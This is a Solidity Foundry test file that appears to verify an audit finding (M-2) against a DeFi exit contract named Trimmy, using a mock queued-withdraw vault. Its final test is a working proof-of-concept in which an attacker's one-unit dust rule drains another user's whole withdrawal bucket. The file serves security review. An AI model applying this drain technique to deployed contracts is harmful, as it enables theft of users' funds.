// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry} from "../mocks/Mocks.sol";

/// @notice Vault mock corrected to match the VERIFIED source of MyERC4626 /
///         TESTearnXRP 0x9E63a5D282F2fBb7DcE822B98e363b2719D28319, fetched from the
///         Coston2 explorer. The difference from test/mocks/Mocks.sol:219 that matters:
///         `_completeWithdraw` has `require(_assets > 0, NoPendingWithdrawAssets())`
///         (source line 402), so a claim on an already-drained bucket REVERTS. The
///         repo's mock silently returns 0 instead.
contract FaithfulQueuedVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable assetToken;
    uint256 public lagDuration = 300;
    uint256 public sharePriceWad = 1e18;

    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawAssets;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawShares;

    error InvalidPeriod();
    error NoPendingWithdrawAssets();
    error NoPendingWithdrawShares();

    constructor(IERC20 a) ERC20("Faithful Vault", "fVLT") {
        assetToken = a;
    }

    function decimals() public view override returns (uint8) {
        return MockERC20(address(assetToken)).decimals();
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        shares = (assets * 1e18) / sharePriceWad;
        _mint(receiver, shares);
    }

    // source line 362-391
    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (owner != msg.sender) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assets = (shares * sharePriceWad) / 1e18;
        uint256 period = (block.timestamp + lagDuration) / 1 days;
        pendingWithdrawAssets[receiver][period] += assets;
        pendingWithdrawShares[receiver][period] += shares;
    }

    // source line 86-95 + 394-411
    function claimWithdraw(uint256 period) external returns (uint256 assets) {
        if (period >= block.timestamp / 1 days) revert InvalidPeriod();
        assets = pendingWithdrawAssets[msg.sender][period];
        if (assets == 0) revert NoPendingWithdrawAssets();
        if (pendingWithdrawShares[msg.sender][period] == 0) revert NoPendingWithdrawShares();
        delete pendingWithdrawAssets[msg.sender][period];
        delete pendingWithdrawShares[msg.sender][period];
        assetToken.safeTransfer(msg.sender, assets);
    }
}

contract VerifyM2Test is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_USD =
        bytes21(uint168(0x015553445430000000000000000000000000000000));

    Trimmy internal exiter;
    MockERC20 internal fxrp;
    MockERC20 internal usdt;
    FaithfulQueuedVault internal vault;
    MockFtsoV2 internal ftso;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal mallory = makeAddr("mallory");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        vm.warp(10 days);
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        usdt = new MockERC20("TestUSDT", "USDT", 6);
        vault = new FaithfulQueuedVault(IERC20(address(fxrp)));

        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_USD, 1_000_000, 6, uint64(vm.getBlockTimestamp()));

        // The redeploy the claim posits: the SHARE token is allowlisted so EXIT_VAULT works.
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(vault), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(usdt), feedId: FEED_USD, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        exiter = new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));

        _fund(alice, 100e6);
        _fund(bob, 100e6);
        _fund(mallory, 1); // one share unit — a dust position
    }

    function _fund(address who, uint256 amt) internal {
        fxrp.mint(who, 1_000e6);
        vm.startPrank(who);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(amt, who);
        vault.approve(address(exiter), type(uint256).max);
        vm.stopPrank();
    }

    function _p(uint128 amt) internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: amt,
            partSellAmount: amt,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    /// The claim says Bob's claim "measures a delta of 0, zeroes pendingShares and pays Bob
    /// nothing". Against the REAL vault it reverts instead. Same money loss, different state.
    function test_secondClaimRevertsNotSilentZero() public {
        vm.prank(alice);
        uint256 ra = exiter.arm(_p(100e6));
        vm.prank(bob);
        uint256 rb = exiter.arm(_p(100e6));

        vm.prank(keeper);
        exiter.execute(ra);
        vm.prank(keeper);
        exiter.execute(rb);

        assertEq(exiter.ruleAt(ra).claimPeriod, exiter.ruleAt(rb).claimPeriod, "same bucket");
        vm.warp(exiter.ruleAt(ra).claimableAt);

        uint256 aBefore = fxrp.balanceOf(alice);
        vm.prank(keeper);
        exiter.claim(ra);
        console2.log("alice received (own stake was 100e6):", fxrp.balanceOf(alice) - aBefore);
        assertEq(fxrp.balanceOf(alice) - aBefore, 200e6, "alice took the whole bucket");

        // Not a silent zero: the real vault reverts.
        vm.prank(keeper);
        vm.expectRevert(FaithfulQueuedVault.NoPendingWithdrawAssets.selector);
        exiter.claim(rb);

        assertEq(exiter.ruleAt(rb).pendingShares, 100e6, "bob's pendingShares survive the revert");
        assertEq(vault.balanceOf(bob), 0, "but bob's shares are burned");
        assertEq(fxrp.balanceOf(bob), 900e6, "bob is down 100 FXRP, permanently");
    }

    /// REACHABILITY on the LIVE allowlist (FXRP 6dp, WC2FLR 18dp — no share token). An
    /// EXIT_VAULT rule arms fine but `execute` cannot reach `_doQueueRedeem`'s bookkeeping,
    /// because `redeem` burns SHARES from Trimmy and Trimmy holds none. So `claim` can never
    /// have pendingShares != 0 and M-2 is dead code on 0xf73a2a...6554.
    function test_liveAllowlistCannotReachTheClaimPath() public {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(usdt), feedId: FEED_USD, decimals: 6});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        Trimmy live = new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));

        fxrp.mint(alice, 1_000e6);
        vm.startPrank(alice);
        fxrp.approve(address(live), type(uint256).max);
        uint256 id = live.arm(_p(100e6)); // arms without reverting
        vm.stopPrank();

        vm.prank(keeper);
        vm.expectRevert(); // ERC20InsufficientBalance: Trimmy holds 0 shares to burn
        live.execute(id);

        vm.warp(vm.getBlockTimestamp() + 2 days);
        vm.expectRevert(Trimmy.NothingPending.selector);
        live.claim(id);
    }

    /// The profitable version: a dust rule armed by an attacker drains the whole day's bucket.
    function test_dustRuleDrainsTheDaysBucket() public {
        vm.prank(mallory);
        uint256 rm = exiter.arm(_p(1)); // ONE share unit
        vm.prank(alice);
        uint256 ra = exiter.arm(_p(100e6));

        vm.prank(keeper);
        exiter.execute(rm);
        vm.prank(keeper);
        exiter.execute(ra);

        vm.warp(exiter.ruleAt(rm).claimableAt);
        uint256 mBefore = fxrp.balanceOf(mallory);
        vm.prank(mallory);
        exiter.claim(rm);
        uint256 gained = fxrp.balanceOf(mallory) - mBefore;
        console2.log("mallory staked 1 unit, received:", gained);
        assertEq(gained, 100e6 + 1, "attacker takes alice's entire exit for 1 unit of dust");
    }
}
